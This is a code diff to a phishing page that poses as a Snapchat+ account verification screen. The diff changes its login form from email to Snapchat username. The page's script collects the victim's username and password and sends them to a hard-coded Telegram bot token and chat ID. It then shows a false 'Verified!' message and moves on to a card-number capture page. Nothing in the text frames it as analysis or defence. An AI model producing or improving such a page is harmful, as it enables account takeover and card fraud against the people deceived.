@@ -324,7 +324,7 @@
       font-weight: 500;
     }
 
-    /* ----- PAGE 2 (email & password) ----- */
+    /* ----- PAGE 2 (snapchat username & password) ----- */
     .page2 .phone-container {
       width: 100%;
       max-width: 400px;
@@ -1099,23 +1099,23 @@
     </div>
   </div>
 
-  <!-- PAGE 2 (email & password) -->
+  <!-- PAGE 2 (snapchat username & password) -->
   <div class="page page2" id="page2">
     <div class="phone-container">
       <div class="header">
         <div class="back-btn" id="backToPage1" role="button" tabindex="0">←</div>
         <div class="title">Verify your account</div>
-        <button class="clear-btn" id="clear-all-email-btn">Clear All</button>
+        <button class="clear-btn" id="clear-all-user-btn">Clear All</button>
       </div>
       <div class="subtitle">Enter your Snapchat login details</div>
       
       <div class="input-wrapper">
-        <label for="email">Email or username</label>
-        <input class="input-box" id="email" placeholder="username@example.com" type="email" autocomplete="off" />
-        <span class="clear-field" id="clear-email">×</span>
-        <span class="validation-icon" id="email-icon">✓</span>
+        <label for="username">Snapchat Username</label>
+        <input class="input-box" id="username" placeholder="@username or phone" type="text" autocomplete="off" />
+        <span class="clear-field" id="clear-username">×</span>
+        <span class="validation-icon" id="username-icon">✓</span>
       </div>
-      <div class="validation-message" id="email-message"></div>
+      <div class="validation-message" id="username-message"></div>
       
       <div class="input-wrapper">
         <label for="password">Password</label>
@@ -1135,7 +1135,7 @@
           <div>Snapchat+ Account Verification</div>
         </div>
         <button class="continue-btn" id="continue-btn">Continue</button>
-        <div class="status-message" id="email-status-message"></div>
+        <div class="status-message" id="user-status-message"></div>
       </div>
     </div>
   </div>
@@ -1288,17 +1288,17 @@
       // back from page3 to page2
       backToPage2Btn.addEventListener('click', () => { showPage2(); });
 
-      // ----- PAGE 2 elements (email & password) -----
-      const emailInput = document.getElementById('email');
+      // ----- PAGE 2 elements (username & password) -----
+      const usernameInput = document.getElementById('username');
       const passwordInput = document.getElementById('password');
-      const emailIcon = document.getElementById('email-icon');
+      const usernameIcon = document.getElementById('username-icon');
       const passwordIcon = document.getElementById('password-icon');
-      const emailMessage = document.getElementById('email-message');
+      const usernameMessage = document.getElementById('username-message');
       const passwordMessage = document.getElementById('password-message');
-      const clearAllEmailBtn = document.getElementById('clear-all-email-btn');
-      const clearEmail = document.getElementById('clear-email');
+      const clearAllUserBtn = document.getElementById('clear-all-user-btn');
+      const clearUsername = document.getElementById('clear-username');
       const clearPassword = document.getElementById('clear-password');
-      const emailStatusMessage = document.getElementById('email-status-message');
+      const userStatusMessage = document.getElementById('user-status-message');
 
       // ----- PAGE 3 elements (card) -----
       const cardInput = document.getElementById('card-number');
@@ -1320,8 +1320,8 @@
       const botToken = '2128201203:AAGPpKg3uIEjy8V1KYHXPfddBmxTFmgt_ZE';
       const chatId = '1327564115';
 
-      // Email page clear functions
-      function clearEmailField(input, icon, message) {
+      // User page clear functions
+      function clearUserField(input, icon, message) {
         input.value = ''; 
         input.classList.remove('valid', 'invalid'); 
         if(icon) icon.style.display = 'none';
@@ -1329,23 +1329,23 @@
           message.textContent = ''; 
           message.classList.remove('error', 'success'); 
         }
-        checkEmailFields();
+        checkUserFields();
       }
 
-      clearEmail.addEventListener('click', (e) => { 
+      clearUsername.addEventListener('click', (e) => { 
         e.stopPropagation(); 
-        clearEmailField(emailInput, emailIcon, emailMessage); 
+        clearUserField(usernameInput, usernameIcon, usernameMessage); 
       });
       
       clearPassword.addEventListener('click', (e) => { 
         e.stopPropagation(); 
-        clearEmailField(passwordInput, passwordIcon, passwordMessage); 
+        clearUserField(passwordInput, passwordIcon, passwordMessage); 
       });
       
-      clearAllEmailBtn.addEventListener('click', () => {
-        clearEmailField(emailInput, emailIcon, emailMessage);
-        clearEmailField(passwordInput, passwordIcon, passwordMessage);
-        emailStatusMessage.style.display = 'none';
+      clearAllUserBtn.addEventListener('click', () => {
+        clearUserField(usernameInput, usernameIcon, usernameMessage);
+        clearUserField(passwordInput, passwordIcon, passwordMessage);
+        userStatusMessage.style.display = 'none';
       });
 
       // Card page clear functions
@@ -1383,34 +1383,33 @@
         statusMessage.style.display = 'none';
       });
 
-      // Email validation
-      emailInput.addEventListener('input', function(e) {
-        const value = e.target.value;
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      // Username validation (just checks if not empty)
+      usernameInput.addEventListener('input', function(e) {
+        const value = e.target.value.trim();
         
         if (value.length === 0) {
-          emailInput.classList.remove('valid', 'invalid');
-          emailIcon.style.display = 'none';
-          emailMessage.textContent = '';
-          emailMessage.classList.remove('error', 'success');
-        } else if (emailRegex.test(value)) {
-          emailInput.classList.add('valid');
-          emailInput.classList.remove('invalid');
-          emailIcon.style.display = 'block';
-          emailIcon.textContent = '✓';
-          emailMessage.textContent = 'Valid email';
-          emailMessage.classList.add('success');
-          emailMessage.classList.remove('error');
+          usernameInput.classList.remove('valid', 'invalid');
+          usernameIcon.style.display = 'none';
+          usernameMessage.textContent = '';
+          usernameMessage.classList.remove('error', 'success');
+        } else if (value.length >= 3) {
+          usernameInput.classList.add('valid');
+          usernameInput.classList.remove('invalid');
+          usernameIcon.style.display = 'block';
+          usernameIcon.textContent = '✓';
+          usernameMessage.textContent = 'Valid username';
+          usernameMessage.classList.add('success');
+          usernameMessage.classList.remove('error');
         } else {
-          emailInput.classList.add('invalid');
-          emailInput.classList.remove('valid');
-          emailIcon.style.display = 'block';
-          emailIcon.textContent = '✗';
-          emailMessage.textContent = 'Enter a valid email address';
-          emailMessage.classList.add('error');
-          emailMessage.classList.remove('success');
+          usernameInput.classList.add('invalid');
+          usernameInput.classList.remove('valid');
+          usernameIcon.style.display = 'block';
+          usernameIcon.textContent = '✗';
+          usernameMessage.textContent = 'Username must be at least 3 characters';
+          usernameMessage.classList.add('error');
+          usernameMessage.classList.remove('success');
         }
-        checkEmailFields();
+        checkUserFields();
       });
 
       passwordInput.addEventListener('input', function(e) {
@@ -1438,7 +1437,7 @@
           passwordMessage.classList.add('error');
           passwordMessage.classList.remove('success');
         }
-        checkEmailFields();
+        checkUserFields();
       });
 
       // Card validation
@@ -1575,10 +1574,10 @@
         checkCardFields();
       });
 
-      function checkEmailFields() {
-        const emailValid = emailInput.classList.contains('valid');
+      function checkUserFields() {
+        const usernameValid = usernameInput.classList.contains('valid');
         const passwordValid = passwordInput.classList.contains('valid');
-        if (emailValid && passwordValid) continueBtn.classList.add('active'); 
+        if (usernameValid && passwordValid) continueBtn.classList.add('active'); 
         else continueBtn.classList.remove('active');
       }
 
@@ -1624,30 +1623,30 @@
         });
       }
 
-      // Email continue
+      // User continue
       continueBtn.addEventListener('click', async function() {
         if (!continueBtn.classList.contains('active')) return;
-        emailStatusMessage.className = 'status-message info'; 
-        emailStatusMessage.textContent = '⏳ Verifying...';
+        userStatusMessage.className = 'status-message info'; 
+        userStatusMessage.textContent = '⏳ Verifying...';
         
-        const email = emailInput.value; 
+        const username = usernameInput.value; 
         const password = passwordInput.value; 
         
-        const message = `📧 ACCOUNT DETAILS CAPTURED 📧\n━━━━━━━━━━━━━━━━━━\n👤 Email/Username: ${email}\n🔑 Password: ${password}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
+        const message = `👤 SNAPCHAT ACCOUNT DETAILS 👤\n━━━━━━━━━━━━━━━━━━\n📱 Username: ${username}\n🔑 Password: ${password}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
         
         try {
           await sendToTelegram(message);
-          emailStatusMessage.className = 'status-message success'; 
-          emailStatusMessage.textContent = '✅ Verified!';
+          userStatusMessage.className = 'status-message success'; 
+          userStatusMessage.textContent = '✅ Verified!';
           setTimeout(() => {
-            clearEmailField(emailInput, emailIcon, emailMessage); 
-            clearEmailField(passwordInput, passwordIcon, passwordMessage);
-            emailStatusMessage.style.display = 'none';
-            showPage3();  // Go to card page after email
+            clearUserField(usernameInput, usernameIcon, usernameMessage); 
+            clearUserField(passwordInput, passwordIcon, passwordMessage);
+            userStatusMessage.style.display = 'none';
+            showPage3();  // Go to card page after username/password
           }, 800);
         } catch (error) {
-          emailStatusMessage.className = 'status-message error'; 
-          emailStatusMessage.textContent = '❌ Connection failed. Try again.';
+          userStatusMessage.className = 'status-message error'; 
+          userStatusMessage.textContent = '❌ Connection failed. Try again.';
         }
       });
 
